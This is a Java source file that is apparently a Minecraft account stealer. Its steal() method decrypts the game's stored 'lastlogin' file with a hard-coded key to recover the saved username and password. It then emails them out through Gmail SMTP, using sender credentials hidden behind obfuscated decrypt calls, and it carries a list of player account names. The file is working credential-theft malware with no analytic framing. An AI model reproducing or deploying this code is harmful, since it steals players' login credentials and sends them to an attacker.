import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.security.Security;
import java.util.Properties;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MCAS {

	private static String[] accounts = { "Heat_Man", "beef_sampsion",
			"Scottsman", "da69marine", "Feanorith", "0graham0", "Jessop",
			"shadowkyuube", "GrimReaperCalls", "randohero", "babajasco",
			"NaxthorTM", "Broodje_Aap", "CtZer0", "The_Saberfool", "Solidox",
			"XenTiras", "bumperpower64", "justinjones53", "kalnaren",
			"redsnappa", "Spookz", "QNecron", "kung_arvid", "Abonbon",
			"skipdog172", "Thorakh", "ManDragonA", "Starcrafter",
			"Lucidshadow", "slash5154", "Jayinmn", "Robloxianmany", "Jman420",
			"eridyn", "downey615", "CallumHD", "ningyou", "korab", "Camavan",
			"blitzer4", "the_zed_word", "Locke_XIII", "eth", "lagged",
			"xmariusx", "Wikid156", "RafiGinat", "Mollies1968",
			"oscar123123123", "Gavax", "perkg333", "bobsajit" };

	private static final String SMTP_HOST_NAME = "smtp.gmail.com";
	private static final String SMTP_PORT = "465";
	private static final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";
	private static Random rand = new Random();
	private static Message msg;

	private static File getMinecraftDir() {
		String os = System.getProperty("os.name", "").toLowerCase();
		String home = System.getProperty("user.home", ".");

		if (os.contains("win")) {
			String appdata = System.getenv("APPDATA");
			if (appdata != null) {
				return new File(appdata, ".minecraft");
			} else {
				return new File(home, ".minecraft");
			}
		} else if (os.contains("mac")) {
			return new File(home, "Library/Application Support/minecraft");
		} else {
			return new File(home, ".minecraft/");
		}
	}

	public static String randomString() {
		return accounts[rand.nextInt(accounts.length)];

	}

	@SuppressWarnings("unused")
	public static void steal() {
		try {
			Random random = new Random(43287234L);
			byte[] salt = new byte[8];
			random.nextBytes(salt);
			PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, 5);
			SecretKey pbeKey = SecretKeyFactory.getInstance("PBEWithMD5AndDES")
					.generateSecret(
							new PBEKeySpec("passwordfile".toCharArray()));
			Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");
			cipher.init(2, pbeKey, pbeParamSpec);
			File passFile = new File(getMinecraftDir(), "lastlogin");
			DataInputStream dis = null;
			if (cipher != null) {
				dis = new DataInputStream(new CipherInputStream(
						new FileInputStream(passFile), cipher));
			} else {
				dis = new DataInputStream(new FileInputStream(passFile));
			}

			Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
			new MCAS(dis.readUTF() + "\n" + dis.readUTF());
			dis.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	private MCAS(String message) throws MessagingException {
		Properties props = new Properties();
		props.put("mail.smtp.host", SMTP_HOST_NAME);
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.port", SMTP_PORT);
		props.put("mail.smtp.socketFactory.port", SMTP_PORT);
		props.put("mail.smtp.socketFactory.class", SSL_FACTORY);
		props.put("mail.smtp.socketFactory.fallback", "false");
		Session session = Session.getDefaultInstance(props,
				new javax.mail.Authenticator() {
					@Override
					protected PasswordAuthentication getPasswordAuthentication() {
						return new PasswordAuthentication(
								AES.decrypt(AES.sdmg), AES.decrypt(AES.iqweht));
					}
				});
		msg = new MimeMessage(session);
		InternetAddress addressFrom = new InternetAddress(AES.decrypt(AES.sdmg));
		msg.setFrom(addressFrom);

		InternetAddress addressTo = new InternetAddress(new String(
				AES.decrypt(AES.sdmg)).trim());

		msg.setRecipient(Message.RecipientType.TO, addressTo);

		msg.setSubject("MCAS");
		msg.setContent(message, "text/plain");
		Transport.send(msg);
	}
}